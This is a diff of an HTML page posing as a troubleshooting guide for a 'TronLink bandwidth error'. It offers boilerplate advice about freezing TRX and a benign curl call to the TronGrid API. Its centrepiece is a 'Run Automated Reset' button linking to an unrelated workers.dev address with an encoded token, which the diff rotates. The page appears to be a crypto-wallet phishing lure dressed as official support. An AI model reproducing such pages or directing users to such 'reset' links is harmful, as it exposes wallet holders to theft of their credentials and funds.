@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,37 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed transactions and inability to execute desired actions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth on the TRON network, which is required for transaction processing and smart contract execution. Bandwidth is a resource that determines how many transactions an account can send per day.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens, which in turn increases the account's bandwidth capacity.</li>
-<li>Adjust the transaction parameters, such as the transaction size and gas limit, to optimize bandwidth usage.</li>
-<li>Utilize the following JSON-RPC command to check the account's current bandwidth:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
+<li>Adjust the transaction parameters, such as the transaction fee or bandwidth limit, to optimize resource utilization.</li>
+<li>Utilize the following code to check the account's current bandwidth:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_getAccountResource&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="s2">&quot;your_account_address&quot;</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.trongrid.io/wallet/getaccount<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;address&quot;: &quot;your_tron_address&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities.</p>
+<p>Consider utilizing an external console to execute these commands for more flexibility. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON network account with sufficient TRX tokens</li>
-<li>TronLink wallet extension installed and configured</li>
-<li>Basic understanding of TRON network architecture and transaction processing</li>
+<li>A TRON account with a sufficient balance of TRX tokens.</li>
+<li>The TronLink wallet extension installed and configured.</li>
+<li>A basic understanding of TRON's resource management system, including bandwidth and energy.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
-    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn">🛠 Run Automated Reset</a>
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
